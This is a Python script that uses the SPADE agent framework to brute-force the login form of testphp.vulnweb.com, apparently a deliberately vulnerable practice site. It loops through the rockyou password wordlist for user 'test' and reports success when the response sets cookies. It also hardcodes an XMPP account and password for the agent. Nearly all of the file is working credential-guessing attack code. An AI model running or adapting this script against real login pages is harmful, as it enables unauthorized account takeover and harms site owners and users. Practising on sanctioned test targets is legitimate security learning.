import requests
from spade import agent, quit_spade
from spade.behaviour import CyclicBehaviour
import time

# POST REQUESTS FORMAT OF THE WEBSITE

"""
POST /userinfo.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded
DNT: 1
Host: testphp.vulnweb.com
Origin: http://testphp.vulnweb.com
Referer: http://testphp.vulnweb.com/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
"""

# prepare the list of passwords
rockyou = open('./wordlists/rockyou.txt')

# agent class for bruteforcing
class AgentBruteforce(agent.Agent):
    class bruteforceBehaviour(CyclicBehaviour):
        async def on_start(self):
            self.url='http://testphp.vulnweb.com/userinfo.php'
            self.params={
                "uname": "test",
                "pass": ""
            }
        async def run(self):
            self.bruteforce()
        def bruteforce(self):
            for password in rockyou:
                self.params["pass"] = password.strip()
                print(self.params)
                # sending bruteforce get request
                response = requests.post(url=self.url, data=self.params)
                cookies = response.cookies
                if len(cookies)>0:
                    print(
                        f'website bruteforced successfuly {self.params["uname"]}:{self.params["pass"]}')
                    self.kill()
                    break

    async def setup(self):
        print("Hello World! I'm agent {}".format(str(self.jid)))
        bruteForce = self.bruteforceBehaviour()
        self.add_behaviour(bruteForce)

jid = "bruteforce@hot-chilli.eu"
passwd = "brute1234"

brute = AgentBruteforce(jid, passwd)
future = brute.start()
future.result()
while brute.is_alive():
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            brute.stop()
            break


brute.stop()
rockyou.close()
quit_spade()
 
